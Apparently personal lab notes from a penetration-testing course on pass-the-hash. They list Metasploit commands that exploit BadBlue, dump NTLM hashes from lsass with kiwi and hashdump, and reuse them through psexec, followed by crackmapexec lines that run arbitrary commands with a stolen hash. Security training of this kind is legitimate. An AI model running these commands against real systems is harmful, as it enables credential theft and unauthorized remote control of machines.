#### Pass- The-Hash
Pass-the-hash is an explitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
- We can use multiple tools to facilitate a Pass-the-hash attack
- - Metasploit PsExec module
- - Crackmapexec
- This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation
#### Exploitation
- nmap -sV demo.ine.local
- service postgresql start
- msfconsole
- search badblue
- use 1
- set everyting requires
- this give meterpreter shell
- pgrep lsass [this give us process id ]
- migrate 780 [ this process id (780) is found from previous command ]
- getuid 
- load kiwi [ load the meterpreter built-in kiwi module ]
- lsa_dump_sam [ this will show all the hashes ]
- copy the administrator NTLM hash 
- hashdump [ this will dump all the hashes,copy all the hashes ]
- background the meterpreter session
- search psexec
- use exploit/windows/smb/psexec
- set everything requires
- set SMBUser Administrator
- set SMBPass nt_hash_value:ntlm_hash_value
- set target Native\ upload
- run
- this will give us meterpreter sessions
- 
#### crackmapexec
- crackmapexec smb 10.2.28.132 -u Administrator -H "NTLM hash value" [ this will use for authentication ]
- crackmapexec smb 10.2.28.132 -u Administrator -H "NTLM hash value" -x "whoami" [ in x parameter value we can execute any command as we want]
